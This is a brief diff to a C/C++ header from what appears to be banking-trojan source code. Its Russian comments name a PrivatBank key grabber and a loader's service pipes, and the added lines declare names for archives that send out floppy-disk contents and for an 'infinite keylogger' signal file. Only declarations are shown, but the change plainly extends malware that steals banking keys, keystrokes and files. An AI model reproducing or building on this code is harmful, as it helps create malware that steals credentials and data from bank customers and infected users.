@@ -69,6 +69,15 @@ extern CSSTR EStrConfigHPFileName[]; // Имя файла хранения конфига повышенного п
 extern CSSTR EStrSystemPrivat[]; // Грабер ключей приватбанка
 
 
+// Имя кабов
+extern CSSTR EStrCabNameDisketa[]; // Имя каба для отправки флопидисков
+
+
+
+// имя сигнального файла бесконечного кейлогера
+extern CSSTR EStrInfiniteKeyLoggerSignal[];
+
+
 // Имена служебный пайпов
 extern CSSTR EStrPipeLoader[]; // Имя служебного пайпа лоадера
 
